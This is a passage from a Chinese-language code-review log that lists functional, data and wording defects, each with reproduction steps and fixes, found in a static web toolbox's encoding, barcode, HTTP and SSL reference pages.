- 描述：`unesc()` 对 `\xHH`、`\uHHHH`、`\u{...}` 直接 `String.fromCodePoint(parseInt(...))`，不校验十六进制合法性与码点范围；`\u{` 缺少右花括号时 `indexOf` 返回 -1，`substring` 取到空串。`parseInt` 得 `NaN`、码点越界或空值都会让 `fromCodePoint` 抛 `RangeError`，`unesc` 没有 try/catch，异常冒泡到内联 `onclick`。
- 证据：`tools/it/regex-escape.html:298-309`（299 `\x`、304 `\u{...}`、307 `\uHHHH`）
- 复现：输入 `\xZZ` 点「反转义」→ 控制台抛 `RangeError: Invalid code point NaN`，输出框保持旧值（期望提示「非法十六进制转义」）；`\u{110000}` → `Invalid code point 1114112`；`\u{` → `Invalid code point NaN`；`\uZZZZ` → 同样抛错。
- 影响：用户在整理日志/正则时输入不完整转义即静默失败，看不到任何界面反馈；旧结果可能被误当成本次结果复制。
- 方案：对 `\x`/`\u` 先校验 `^[0-9a-fA-F]{2,4}$` 与码点 ≤ 0x10FFFF，`\u{...}` 要求存在闭合 `}`；失败时在输出区显示具体位置与原因，并清空旧输出。

- 备注：`tools/it/punycode.html:404-410`、`tools/it/regex-escape.html:321-328` 的 `copyResult` 依赖全局 `event`（与 IT-N31 同模式，Firefox 可能失效），不重复计数，未单列为新条目。
- 本轮实读 8 页：`tools/it/punycode.html`、`tools/it/regex-escape.html`、`tools/it/css-minifier.html`、`tools/it/date-duration.html`、`tools/it/ipv4-range-expander.html`、`tools/it/user-agent-parser.html`、`tools/it/hash-multi.html`、`tools/it/http-cache.html`；新增 15 条（高 3 / 中 8 / 低 4）；未覆盖：`tools/it` 其余非文本页（如 `html-minifier`、`html-nesting-checker`、`c-string-escape`、`go-escape`、`java-escape`、`js-minifier`、`js-obfuscator`、`sql-formatter`、`shell-script-formatter`、`dockerfile-generator`、`gitignore-generator`、`robots-txt-generator`、`sitemap-generator`、`ssh/证书/密钥类` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 N）

> 范围：本轮阅读 8 页（`tools/it/ip-calculator.html`、`tools/it/html-minifier.html`、`tools/it/barcode-ean.html`、`tools/it/docker-run-converter.html`、`tools/it/cron.html`、`tools/it/qr-decoder.html`、`tools/it/url-encode.html`、`tools/it/base64-converter.html`）。仅源码 + Node 复算，未开浏览器/未做 EN/移动端/门禁验证。


- 本轮实读 8 页：`tools/it/ip-calculator.html`、`tools/it/html-minifier.html`、`tools/it/barcode-ean.html`、`tools/it/docker-run-converter.html`、`tools/it/cron.html`、`tools/it/qr-decoder.html`、`tools/it/url-encode.html`、`tools/it/base64-converter.html`；新增 15 条（高 2 / 中 12 / 低 1）；未覆盖：`tools/it` 其余非文本页（如 `base32-encode`、`base58-encode`、`base85-encode`、`http-headers`、`http-status`、`http-methods`、`mime-type`、`gitignore-generator`、`dockerfile-generator`、`shell-script-formatter`、`ipv6-ula`、`ssl-info`、`aes/des/rsa/ecdsa` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 O）

范围：本分区「01 IT：非文本类剩余」8 页（`ipv6-ula` / `ssl-info` / `http-status` / `http-headers` / `mime-type` / `aes-encryptor` / `rsa` / `base32-encode`），编号接续 IT-N85，从 IT-N86 起。

### IT-N89 AES 加密/解密：文件按钮把文件转成 Base64 再加密，等于二次编码且无法还原文件（中，确认源码缺陷）
- 问题：`handleFile()` 读文件后写入 `#input` 的是 `bytesToBase64(bytes)` 文本，随后加密对这段 Base64 文本做 UTF-8 编码；解密只把明文回填到文本框，页面没有任何"另存为原文件"的下载入口，`currentFile` 仅用于显示文件名。
- 证据：`tools/it/aes-encryptor.html:988-1006`（1002 写入 Base64）、`tools/it/aes-encryptor.html:831-832`（`TextEncoder` 再编码）、页面无 `downloadText`
- 复现：选一个 1KB 的 `a.bin` → 输入框变为 Base64 文本；加密→解密后得到的是同一段 Base64 文本（不是原文件字节）；若想得到原文件还需再手工 Base64 解码，且本页不提供该功能。
- 影响："文件加密/解密"名实不符，密文体积翻倍且丢失二进制语义；用户无法完成文件级往返。
- 方案：文件模式直接把 `Uint8Array` 作为明文/密文（跳过 TextEncoder），解密后提供"下载原文件"按钮并按原文件名保存；或在 UI 明示"文件仅转为 Base64 文本，不支持还原"。
- 状态（2026-11-06）：本批未处理——彻底修复需新增"下载原文件"按钮与文件名字还原链路，涉及新增 UI 标签（须同步 `js/tool-i18n-en.js` GEN_UI_MAP），单列下批处理；本页 N86/N87/N88/N91/N92 已在同批修复。

### IT-N97 SSL/TLS 知识速查：中文说"浏览器无法读取远程证书"，英文却说"从主机读取证书详情"（中，确认源码缺陷）
- 问题：同一 `<p>` 的中文 `data-zh` 明确写"纯前端静态工具…浏览器无法直接读取远程证书…请用锁图标或 openssl s_client"，而英文正文承诺 "Decode and inspect SSL/TLS certificate details (issuer, validity, SAN) from a host in your browser."；页面实际没有任何主机输入与证书读取能力。
- 证据：`tools/it/ssl-info.html:155-157`
- 复现：`?lang=en-US` 打开页面 → 简介宣称可读取远程证书；页内无 host/URL 输入，只有"知识速查 + 强度估算器"两个页签（期望英文与中文同义，或提供 PEM 粘贴解析）。
- 影响：英文用户按说明寻找"输入域名看证书"功能而找不到，信任受损；也是 SEO 描述与实际功能不符。
- 方案：英文改为与中文一致的静态说明（"reference only; use the address-bar lock icon or openssl s_client"）；若想兑现该描述，另加"粘贴 PEM 证书离线解析 SAN/有效期/颁发者"。

### IT-N98 SSL/TLS 知识速查：预设条重复，且其中一条标签被截断成"…"（中，确认源码缺陷）
- 问题：正文手写了一条 `data-tb="preset"`，标签是生成时被截断的 `"算力（次/秒）：1000000000000·算法类型：ae…"`；同时脚本又调用 `TBKit.preset.bar('#ssl_infoPresets', …)`，而页面没有该 id，`preset.ensureHost` 会在第一个 `input[type=number]`（`#calcSpeed`）前自动新建宿主，于是同一页出现两条预设栏，手写那条永远显示省略号。
- 证据：`tools/it/ssl-info.html:295`（截断标签）、`tools/it/ssl-info.html:575-577`（脚本预设）、`js/tool-kit.js:1013-1031`（缺宿主时自动建）
- 复现：打开"强度估算器" → 预设区出现两组按钮（一组"默认参数/…"，另一组"默认参数/AES-256/…"），其中第一组首个按钮文字以 `ae…` 结尾（期望仅一条预设、标签完整）。
- 影响：UI 重复且出现裸省略号，像未完成的占位内容；也浪费首屏高度。
- 方案：删除 295 行手写 `data-tb="preset"`（或改成 `id="ssl_infoPresets"` 的宿主并删脚本重复注册），标签用完整中文"算力 1e12 次/秒 · AES-128"。

### IT-N99 SSL/TLS 知识速查：破解耗时取整越界，364.99 天显示成"12 个月"（低，确认源码缺陷）
- 问题：各档位先按上限判断再 `Math.round`，临界值会跨档：`sec=31,535,999`（差 1 秒满一年）→ `Math.round(31535999/2592000)=12` → "12 个月"；`sec=59.7` → "60 秒"；`sec=86,399` → "24 小时"。
- 证据：`tools/it/ssl-info.html:450-464`（453/454/455/457 行）
- 复现（Node 复算页内 `formatTime`）：`formatTime(31535999)` → 实际 `12 个月`（期望 `1 年`）；`formatTime(59.7)` → `60 秒`（期望 `1 分钟`）；`formatTime(86399)` → `24 小时`（期望 `1 天`）。
- 影响：估算结果在临界点自相矛盾（"12 个月"却 <1 年），降低可信度。
- 方案：先对秒数做向下取整到目标单位再判档，或在 `Math.round` 后若达到下一档阈值则进位；补 59.5/3599/86399/31535999 边界用例。

### IT-N100 SSL/TLS 知识速查：算力输入不校验正数，负数会得到"< 1 秒"却判"不安全"（低，确认源码缺陷）
- 问题：`parseFloat(...) || 1` 只兜底空值/0/NaN，负数原样进入 `sec = avg / speed`，得到负时间；`formatTime` 落进 `sec < 1` 分支输出"< 1 秒"，安全分级落到"❌ 不安全"。
- 证据：`tools/it/ssl-info.html:412`、`tools/it/ssl-info.html:432-438`、`tools/it/ssl-info.html:452`
- 复现：算法 AES-128、算力输入 `-100` → 实际"破解耗时 < 1 秒 / 不安全"（期望提示"算力必须为正数"或按 1 次/秒计算并标注）。
- 影响：负时间在语义上不可能，结果自相矛盾；用户可能误以为工具算错。
- 方案：`const speed = parseFloat(...); if (!(speed > 0)) { toast/提示; 回退 1 }`；同时把 `min="1"` 的约束在 JS 侧执行（浏览器只拦 spinner，手输可绕过）。

- 留存建议（ssl-info）：①增加"粘贴 PEM 证书离线解析"（SAN/有效期/颁发者/密钥用法），比纯口诀更实用；②强度估算增加"所需算力/电费量级"与"推荐算法"结论；③补 SSL3/TLS1.0-1.3 对照与常见配置错误清单，并提供可复制的 Nginx 配置片段。

### IT-N101 HTTP 状态码速查：宣称"全部标准状态码"，实际仅 32 条且漏掉正文自己引用的 203（中，确认源码缺陷）
- 问题：meta/og/twitter 描述均写"汇总 1xx~5xx 全部标准状态码"，但 `statusCodes` 只有 32 条；缺 103、203、205、300、303、305、411、412、414、416、417、418、421、425、426、428、431、451、506、507、508、510 等常用/标准码。正文引据表还专门举例"203 非权威响应"，列表里却搜不到。
- 证据：`tools/it/http-status.html:10`（meta 声明）、`tools/it/http-status.html:283-322`（32 条数据）、`tools/it/http-status.html:257`（引据 203）、无 203/451 条目
- 复现：搜索 `451`（RFC 7725 法定禁播）→ 实际"无匹配状态码 0 条"；搜索 `203` → 同样 0 条，而页面引据表第 257 行刚提到它。
- 影响：SEO 承诺与内容不符；开发者查 451/428/431 等常见码查不到，需另找资料。
- 方案：补齐至少 103/203/205/300/303/411/412/414/416/417/418/421/425/426/428/431/451/506/507/508/510，或把文案改为"常用状态码速查（32 条）"；补 203 与 451 的搜索用例。

### IT-N102 HTTP 状态码速查：401 卡片写"未授权"，与 FAQ/概览的"未认证"自相矛盾（低，确认源码缺陷）
- 问题：列表卡片 `desc:'未授权'`，而概览写"401 未认证"，FAQ 又明确"401 Unauthorized 表示『未认证』…403 已认证但无权限"。同一页对 401 给出两种中文名。
- 证据：`tools/it/http-status.html:303`（`desc:'未授权'`）、`tools/it/http-status.html:176`（概览"401 未认证"）、`tools/it/http-status.html:232`（FAQ"未认证"）
- 复现：搜索 401 → 卡片显示"401 Unauthorized 未授权"；往下读 FAQ 却说应为"未认证"（期望统一为"未认证（Unauthorized）"）。
- 影响：正是 401/403 最易混的点，卡片用词反而强化了错误理解。
- 方案：把 303 行 desc 改为"未认证"，detail 保持；补 401/403 对比用例。

### IT-N103 HTTP 状态码速查：筛选无结果时底部冒出无表头空表格（低，确认源码缺陷）
- 问题：`#httpTable` 默认 `display:none`，`__httpExtras()` 只在 `list.length===0` 时把它设为可见并清空表头，非空时反而不显示（只在导出时显示）；于是"无匹配"场景会留下一条空白表格边框。
- 证据：`tools/it/http-status.html:198`（默认隐藏）、`tools/it/http-status.html:378-382`（382 行空列表置 `display=''`）
- 复现：搜索 `zzz` → 列表显示"无匹配状态码"，其下出现一块无表头、无行的空表格（期望保持隐藏）。
- 影响：视觉噪点，像是加载失败的表格。
- 方案：空列表时 `t.style.display='none'`；或干脆移除"无结果也显示表"的分支，导出时再按需显示。

- 留存建议（http-status）：①补 301/302/307/308 与 401/403/404/410 的决策对照表；②支持"复制整行/导出全量 CSV"（当前导出只导当前筛选且需先点导出才渲染表）；③增加常见框架默认页（Nginx/Tomcat/Spring）对应状态码的排查提示。

### IT-N106 HTTP 请求头速查：中文标题只写"请求头"，条目却含大量响应头（低，确认源码缺陷）
- 问题：`<h1 class="sr-only">`、面包屑、`<title>` 均称"HTTP 请求头速查"，但数据里含 `Server`、`X-Powered-By`、`Allow`、`WWW-Authenticate`、`Set-Cookie` 等响应头（英文简介写的是 "request and response headers"，反而准确）。
- 证据：`tools/it/http-headers.html:143`（h1）、`tools/it/http-headers.html:159`（面包屑）、`tools/it/http-headers.html:939-969`（响应分类 4 条）、`tools/it/http-headers.html:339`（Set-Cookie 亦为响应头）、`tools/it/http-headers.html:175`（英文简介含 response）
- 复现：页面标题显示"HTTP 请求头速查"，但列表可筛出"响应"分类 4 条（Server/X-Powered-By/X-AspNet-Version/X-UA-Compatible）。
- 影响：中文用户对收录范围预期不一致；也更难理解"响应头为何在请求头表里"。
- 方案：中文统一为"HTTP 请求/响应头速查"（含 `<title>`、h1、面包屑、JSON-LD `name`），或增加"方向（请求/响应/通用）"标签与过滤。

- 留存建议（http-headers）：①增加"请求/响应/通用"方向过滤与 CORS/缓存/安全三组场景预设；②每条支持复制 curl/Node/fetch 片段（当前仅复制单行示例）；③补 Cache-Control/HSTS/CSP 后提供"安全响应头基线"清单。

### IT-N109 MIME 类型速查表：个别映射过时/分类不当（低，确认源码缺陷）
- 问题：`.exe` 给 `application/x-msdownload`（IANA 已注册 `application/vnd.microsoft.portable-executable`）；`.ai` 给 `application/postscript`（现代 Illustrator 文件实为 PDF 容器，常见为 `application/pdf` 或 `application/illustrator`）；`.m3u8` 归"视频"（实际是 HLS 播放列表 `application/vnd.apple.mpegurl`）。
- 证据：`tools/it/mime-type.html:313`（exe）、`tools/it/mime-type.html:339`（ai）、`tools/it/mime-type.html:292`（m3u8）
- 复现：查 `.exe` → 显示 `application/x-msdownload`（期望注册值或标注"非注册常用值"）；查 `.ai` → `application/postscript`（与服务端实际收到的 PDF 头不符）。
- 影响：按表配置 `Content-Type` 时可能触发下载/嗅探差异；`.ai` 上传校验可能被误判。
- 方案：改用注册值并保留常见别名（如 `application/vnd.microsoft.portable-executable`）；`.ai` 标注"PDF 兼容，推荐 application/pdf"；`.m3u8` 移入"其他/流媒体"。

- 留存建议（mime-type）：①提供"反向查询"（输入 `application/json` → 推荐扩展名）；②数据表按分类分组并支持导出全量 CSV；③每条给 Nginx/Apache 的 `types` 配置片段一键复制；④补 `charset`/`nosniff` 配置示例。

- 留存建议（base32-encode）：①补 Base32hex / Crockford / z-base-32 的字母表对照与切换（页面已提"不可混用"）；②结果区显示字符数/填充数（当前无任何统计）；③提供编码→解码一键往返校验与非法样例提示。

- `ipv6-ula`：无剩余缺陷（IT-N113 上限提到 50 并同步公式/预设、IT-N114 改 `crypto.getRandomValues` 且无安全源时显式告警、IT-N115 fd=8 位/40 位全局 ID/16 位子网三源同步、IT-N116 加复制全部按钮且导出改为本次前缀 CSV，四项均已销账，第195批；verify 5 条强锁 + JSDOM 真机 28/28、旧源码 18/28）。
- 留存建议（ipv6-ula）：①增加"固定前缀 + 子网 ID 位数"可配置（当前子网恒为 0）；②支持生成多子网（`/48` → 多个 `/64`）与 JSON/CSV 清单导出；③提供"复制 curl/配置片段"（如 `ip -6 addr add`）。

- 备注：`tools/it/mime-type.html:368` 与 `tools/it/base32-encode.html:309` 的复制按钮仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效，与 IT-N31 同模式），不重复计数、未单列。
- 本轮实读 8 页：`tools/it/ipv6-ula.html`、`tools/it/ssl-info.html`、`tools/it/http-status.html`、`tools/it/http-headers.html`、`tools/it/mime-type.html`、`tools/it/aes-encryptor.html`、`tools/it/rsa.html`、`tools/it/base32-encode.html`；新增 31 条（高 2 / 中 17 / 低 12）；未覆盖：本分区其余非文本页（`base58-encode`、`base85-encode`、`http-methods`、`gitignore-generator`、`dockerfile-generator`、`shell-script-formatter`、`aes/des/ecdsa` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 P）

范围：只读实读 8 页（`tools/it/base58-encode.html`、`base85-encode.html`、`barcode-code128.html`、`barcode-upc.html`、`bluetooth-version.html`、`usb-version.html`、`ascii-table.html`、`caesar-cipher.html`），编号接续 IT-N117。所有数值结论均用 `node -e` 按页面源码逻辑（或 `/js/barcode-lib.js`）复算；未开浏览器、未跑构建/门禁、未做 EN/繁体/移动端验证。上一轮已记入 IT-N110/111/112 的 Base32 同型问题不作为本轮重复项。

### IT-N119 Base58 编解码：只支持文本（UTF-8），与 meta"输入文本或字节"不符；二进制解码静默变 U+FFFD（低，确认源码缺陷）
- 问题：页面输入是单个 `<textarea>`，编码固定 `new TextEncoder().encode(text)`、解码固定 `new TextDecoder().decode(bytes)`；没有字节/十六进制输入，也没有字节输出。非 UTF-8 的 Base58 载荷（如比特币原始公钥）解码后会被替换为 `U+FFFD`，且无任何提示。
- 证据：`tools/it/base58-encode.html:10`（meta"输入文本或字节"）、`tools/it/base58-encode.html:174`（唯一文本输入）、`tools/it/base58-encode.html:314`、`tools/it/base58-encode.html:321`
- 复现：把字节序列 `[0x80, 0xFF]` 按页内 `encodeBase58()` 编成 Base58 再粘回解码 → 实际输出两个 `�`（U+FFFD），无"非文本数据"提示（`TextDecoder` 静默替换非法字节）。期望：提供 hex/字节视图或明确拒绝。
- 影响：把二进制当文本处理会静默损坏数据，与 meta 承诺不符。
- 方案：增加"文本 / Hex 字节"输入切换，解码输出同时给 UTF-8 文本与 hex；若不做，删掉 meta 中的"或字节"。

- 留存建议（base58-encode）：①补"文本 / Hex 字节"双模式，真正兑现 meta；②结果区显示字符数与字节数；③支持 Base58Check（双 SHA-256 前 4 字节）校验，或明确标注"仅纯 Base58、不校验地址"。

### IT-N120 Base85 编解码："Z85"预设必然报错（`ZeroMQ Z85` 为 10 字节，非 4 的倍数）（中，确认源码缺陷）
- 问题：预设 `Z85` 把输入设为 `ZeroMQ Z85`（10 字节），而 `encodeZ85()` 开头硬性要求字节数为 4 的倍数并抛错；点击该预设只会弹出"编码失败：Z85 编码要求字节数为 4 的倍数"，输出保持旧值。
- 证据：`tools/it/base85-encode.html:484`（预设值）、`tools/it/base85-encode.html:309-310`（`bytes.length % 4 !== 0` 抛错）
- 复现（Node 复算）：`node -e "console.log(new TextEncoder().encode('ZeroMQ Z85').length%4)"` → `2`；因此 `Z85` 预设 100% 失败。期望预设改用 8/12 字节样例（如 `ZeroMQ!!` 8 字节）或自动补位。
- 影响：三种变体里的 Z85 无法通过预设体验，用户会误以为 Z85 模式坏了。
- 方案：预设改 `ZeroMQ!`（8 字节）等 4 倍数样例；或在 UI 提示"Z85 需 4 字节对齐"并禁用不合规预设。

### IT-N121 Base85 编解码：两个解码器都不校验 5 字符组的数值上限（85⁵ > 2³²），非法组静默产出错误字节（中，确认源码缺陷）
- 问题：`decodeZ85()` 把 5 个字符累加成 `n` 后直接用 `n >>> 24` 等按 32 位截断；`decodeAscii85()` 同样不校验 `n ≤ 0xFFFFFFFF`。而 85⁵−1 = 4437053124 > 4294967295，规范要求该组非法。超出上限的组不会被拒绝，而是按 `n mod 2³²` 输出字节。
- 证据：`tools/it/base85-encode.html:334-336`（累加后直接位运算）、`tools/it/base85-encode.html:284-296`（Ascii85 同样无上限校验）
- 复现（Node 复算页内函数）：`decodeZ85('#####')` → 实际 `08 78 0e c4`，无异常；`decodeAscii85('<~uuuuu~>')` → 同样 `08 78 0e c4`。该组十进制值 4437053124 > 2³²−1，期望抛"非规范 Base85 组"。
- 影响：截断/篡改的 Base85 被当成合法数据解码，输出看似正常但语义错误（用于二进制载荷时不可察觉）。
- 方案：累加后 `if(n > 0xFFFFFFFF) throw new Error('非规范组')`；Ascii85 同理；补 `#####`/`uuuuu` 两条负例。

### IT-N122 Base85 编解码：deep-dive 示例少写一个字符（实际 `<~87cURDZ~>`）（低，确认源码缺陷）
- 问题：示例称 `Hello` → `<~87cURD~>`，但 `Hello` 的 5 字节应编为 5+2=7 个 payload 字符；页面实现实际输出 `<~87cURDZ~>`（8 字符）。
- 证据：`tools/it/base85-encode.html:220`（示例）；算法见 `tools/it/base85-encode.html:264-282`
- 复现（Node 复算页内 `encodeAscii85`）：`Hello` → `<~87cURDZ~>`；示例值 `<~87cURD~>` 无法被本页解码回 `Hello`（缺 `Z` 时解出 `Hell`）。
- 影响：示例与实现不一致，用户复制示例去解码会得到 `Hell`。
- 方案：改为 `<~87cURDZ~>`；建议示例同时给出"输入/输出/可逆验证"三行。

### IT-N123 Base85 编解码：引据写 RFC 1924（其字符表与本页两种变体都不同），且 formula-list 声称支持 `y` 但实现没有（低，确认源码缺陷）
- 问题：本页只实现 Adobe Ascii85（`!`~`u` + `z`）与 ZeroMQ Z85；RFC 1924 的 Base85 字母表是另一套（`0-9A-Za-z!#$%&()*+-;<=>?@^_`{|}~`），既非 Ascii85 也非 Z85。另 formula-list 写"`y` 用于特定历史情形"，但 `decodeAscii85()` 遇到 `y`（码值 88 > 84）直接抛"非法字符"。
- 证据：`tools/it/base85-encode.html:160`（`y` 的说法）、`tools/it/base85-encode.html:243-244`（RFC 1924 引据）、`tools/it/base85-encode.html:295`（`c > 84` 抛错）
- 复现：解码 `y` 开头的组 → 实际"非法字符: y"；期望要么支持（btoa 扩展把 `y` 视为 4 个空格），要么在说明中不要声称支持。
- 影响：引据不可核、说明与行为不符，教学场景易误导。
- 方案：引据改为 Adobe PostScript Language Reference（Ascii85）与 ZeroMQ RFC 32/Z85；删除 `y` 说法或实现 `y`→4 空格。

- 留存建议（base85-encode）：①Z85 预设改为 4 字节对齐样例并显示对齐要求；②解码加组值上限与非规范组报错；③结果区显示"字符数 / 膨胀率"并支持 `<~ ~>` 可选开关。

### IT-N124 Code128 条形码：宣称支持全部 ASCII 0–127，但"可打印 + 控制字符"混合输入被拒（中，确认源码缺陷）
- 问题：`code128Encode()` 的子集选择是"整串只能落在一个区间"：纯偶数位数字→C；整串都在 32–127→B；整串都在 0–95→A；否则报"仅支持 ASCII 0~127"。因此 `a\x01`（97 与 1，均在 0–127 内）被拒绝，但正确做法是 B→A 切换（或 A→B），Code 128 本身完全支持。
- 证据：`js/barcode-lib.js:65-79`（三段互斥判断与错误文案）、`tools/it/barcode-code128.html:192`（deep-dive"支持全部 128 个 ASCII 字符"）
- 复现（Node 调 `ToolBoxBarcode.code128`）：`A\x01` → ok（subset A）；`a\x01` → 实际 `ERR: Code 128 仅支持 ASCII 0~127…`，但该串每个字符都在 0–127 内。期望成功编码（B + Code A 切换）。
- 影响：含控制字符的混合串（如 ESC/POS 指令、带制表符的字段）无法生成条码，且错误文案把"实现限制"说成"字符集限制"。
- 方案：实现 A/B/C 动态切换（至少 B↔A 一次切换），或把文案改为"暂不支持跨可打印/控制区间的混合内容"；补 `a\x01` 用例。

### IT-N125 Code128 条形码：空输入被 `|| ' '` 吞掉，静默生成"空格"条码（低，确认源码缺陷）
- 问题：`generate()` 用 `B.encode('code128', text || ' ')`，空输入被替换成一个空格，编码库的"请输入条码内容"错误永远不会触发；结果区显示一个 legit 但无意义的条码。
- 证据：`tools/it/barcode-code128.html:265-266`（`text || ' '`）、`js/barcode-lib.js:63`（空串本应报错）
- 复现：清空输入框后点"生成" → 实际渲染空格条码（文本区显示 ` · Code B · 1 个符号 · 校验位 …`）；期望提示"请输入条码内容"。
- 影响：空标签被当成有效条码打印/下载，扫码结果为空格。
- 方案：去掉 `|| ' '`，改为 `if(!text.trim()){ 行内提示; return; }`。

### IT-N126 Code128 条形码：引据表把符号结构写成"3 条 2 空"，与自身公式"3 条 3 空"矛盾（低，确认源码缺陷）
- 问题：Code 128 每个符号 11 模块由 3 条 + 3 空共 6 个元素构成；formula-desc 写"3 条 3 空"正确，但底部引据表写"每字符 11 模块，含 3 条 2 空"（英文 "3 bars + 2 spaces"）。
- 证据：`tools/it/barcode-code128.html:158`（正确说法）、`tools/it/barcode-code128.html:228`（引据表错误说法）
- 复现：阅读同页两处说明 → 元素数 6 vs 5 自相矛盾；按"3 条 2 空"无法凑出 11 模块的合法符号。
- 影响：教学性引据错误，读者按此理解符号结构会出错。
- 方案：改为"3 条 3 空（6 元素，11 模块）"。

- 留存建议（code128-encode）：①实现 A/B/C 动态切换并显示切换点；②增加 SVG 导出与静区宽度提示（当前仅 PNG 且 quiet 固定 10）；③补 FNC1/GS1-128 的"暂不支持"明示，避免 deep-dive 提及但工具无入口。

### IT-N127 UPC 条形码：本地 `buildUPC` 静默补零/截断，空输入与纯字母生成全零条码（中，确认源码缺陷）
- 问题：页面没有加载共享库，自己实现 `buildUPC()`：`d.length<11` 时用 `padEnd(11,'0')` 补零，`>=12` 时 `slice(0,12)` 截断，且先 `replace(/\D/g,'')` 吞掉非数字；因此任意短输入都会被"补成"另一个商品码，空输入/纯字母得到全零码。
- 证据：`tools/it/barcode-upc.html:252-263`（254 补零、256 截断）、`tools/it/barcode-upc.html:290-292`（无校验直接绘制）、对比 `js/barcode-lib.js:156-166`（共享库 `upcaEncode` 对非 11/12 位直接报错）
- 复现（Node 复算页内函数）：`123` → 实际 `123000000006`（期望报"需要 11 或 12 位"）；`''`/`abc` → 实际 `000000000000`；`1234567890123` → 实际 `123456789012`。
- 影响：用户输入 3 位内部编号即得到一条"合法但错误"的 UPC，打印后扫出的是另一个商品；全零码更是明显的无效标签。
- 方案：直接复用 `/js/barcode-lib.js` 的 `upca`（已含位数/校验位校验）；或本地补 `length!==11 && length!==12 → 报错`，禁止补零/截断。

### IT-N128 UPC 条形码：12 位输入不校验第 12 位，错误校验位照常渲染（中，确认源码缺陷）
- 问题：`buildUPC()` 只在长度恰好 11 时补校验位；长度 12 时原样使用，不比较 `upcCheck(d.slice(0,11))` 与第 12 位。
- 证据：`tools/it/barcode-upc.html:255-256`（仅补位与截断，无校验分支）；对照 `js/barcode-lib.js:160-164`（共享库会返回"第 12 位校验位应为 2"）
- 复现（Node 复算）：`036000291451`（正确应为 `…2`）→ 实际原样渲染 `036000291451`，无任何提示；期望报错并提示正确校验位 2。
- 影响：供应商标签验收、手工改码时，错误校验位不会被发现，扫码枪按 GS1 规则会拒读。
- 方案：长度 12 时校验末位，不符则行内报"校验位应为 X"；或直接换用共享库。

### IT-N129 UPC 条形码：条码下方数字未按标准把首位数字印在左静区，与自身引据"first digit in left quiet zone"矛盾（低，确认源码缺陷）
- 问题：`drawBarcode()` 只在条码下方居中打印 `digits.slice(0,6)` 与 `digits.slice(6)`，首位（数字系统字符）混在左侧 6 位里，未单独放在左静区；引据表却写"首位数字印于左静区"。
- 证据：`tools/it/barcode-upc.html:275-276`（两组文字定位）、`tools/it/barcode-upc.html:222`（引据）
- 复现：生成 `036000291452` → 实际下方为 `036000`（含首位 0）与 `291452`；期望左静区单印 `0`，下方两组为 `360002` / `91452`。
- 影响：人眼核对与标准标签不一致，验收时易误判。
- 方案：把首位单独 `fillText` 在左静区（x≈0），两组按 `digits.slice(1,7)` / `slice(7)` 定位。

- 留存建议（barcode-upc）：①删除本地 `buildUPC`，统一走共享库；②非法输入改行内红色提示（当前无任何错误通道）；③补 UPC-E 互转/校验位自动纠正说明，兑现 FAQ 的 UPC-E 提及。

### IT-N130 蓝牙版本速查：三个下拉框没有任何 `<option>`，版本/对比版本/场景完全无法选择（高，确认源码缺陷）
- 问题：`#v`、`#v2`、`#scene` 都是空 `<select>`；全页既无 `<option>` 标记，也无 `new Option`/`appendChild` 之类的填充代码。`calcTool()` 只能拿到空值，靠 `|| '5.3'`、`|| '5.0'`、`|| 'audio'` 兜底，页面展示的永远是"5.3 vs 5.0 + audio 场景"这一组默认结果。
- 证据：`tools/it/bluetooth-version.html:129`、`tools/it/bluetooth-version.html:133`、`tools/it/bluetooth-version.html:137`（三个空 select）、`tools/it/bluetooth-version.html:271-273`（读值 + 兜底）、`tools/it/bluetooth-version.html:308-310`（`resetForm` 对空 select 置 `selectedIndex=0` 实为 −1）
- 复现（Node 静态校验）：`<select id="v">`、`<select id="v2">`、`<select id="scene">` 内部文本长度均为 0，全页 `<option` 计数为 0，`appendChild`/`new Option` 计数也为 0；因此打开页面三个下拉均无项，换任何操作结果都不变。期望至少 6 个版本项（4.2/5.0/5.1/5.2/5.3/5.4）与 3 个场景项（audio/iot/peripheral）。
- 影响：核心交互（选版本、选场景做对比）完全不可用，页面退化为固定的一张默认结果卡；这也解释了为什么"计算"按钮看起来没有反应。
- 方案：在 boot 时用 `info` 表的 key 生成 `#v`/`#v2` 的 option，场景用固定 `audio/iot/peripheral` 生成 `#scene`；或直接在 HTML 写死 `<option>`，避免再次漏项。

### IT-N131 蓝牙版本速查：数据表只覆盖 4.2~5.4，未命中静默回退 5.3/5.0（补齐下拉后会显示错误对比数据）（中，确认源码缺陷）
- 问题：`info` 只有 `4.2/5.0/5.1/5.2/5.3/5.4`，缺 1.x/2.x/3.0/4.0/4.1；`row=info[v]||info['5.3']`，一旦选项里出现 4.0/4.1，页面会显示"Bluetooth 4.0"标题却配 5.3 的 2 Mbps 与"连接子评级"特性，且无提示。
- 证据：`tools/it/bluetooth-version.html:274-281`（info 表）、`tools/it/bluetooth-version.html:282`（静默回退）、`tools/it/bluetooth-version.html:114`（公式区自述回退规则）
- 复现（Node 复算映射）：`v='4.0', v2='4.2'` → 实际 `2 Mbps / 2 Mbps`、特性"连接子评级、周期广播改进"（均为 5.3 的内容）；期望 4.0 显示 1 Mbps（BLE）且标注"无 2M PHY"。
- 影响：当前因下拉为空暂时不可见，但一旦按 N130 补选项即暴露"张冠李戴"的对比结论，属于高风险的潜在数据错误。
- 方案：补齐 1.x~4.1 行；对未覆盖版本显示"暂无数据"而不是回退；回退时在结果区标注"未收录，按 5.3 代替"。

### IT-N132 蓝牙版本速查：meta/og/twitter/JSON-LD 描述整句重复两遍（低，确认源码缺陷）
- 问题：description 写成"蓝牙版本速查是一款免费的在线IT 开发工具，蓝牙版本速查是一款免费的在线IT 开发工具，输入参数即可实时得出结果；纯前端运行、数据不上传…纯前端运行、数据不上传…"，同句重复。
- 证据：`tools/it/bluetooth-version.html:13`、`tools/it/bluetooth-version.html:16`、`tools/it/bluetooth-version.html:33`、`tools/it/bluetooth-version.html:36`
- 复现：查看页面源码或搜索结果摘要 → 同句连续出现两次；期望单次且语义完整（本页是速查表，不应写"输入参数即可实时得出结果"）。
- 影响：搜索结果摘要冗长且像机器拼接，降低点击率；与同批 usb-version 的正常文案不一致，说明是单页模板污染。
- 方案：改为"蓝牙 5.4/5.3/5.2/5.1/5.0/4.2 的速率、距离、LE Audio 与 AoA/AoD 特性对照速查"。

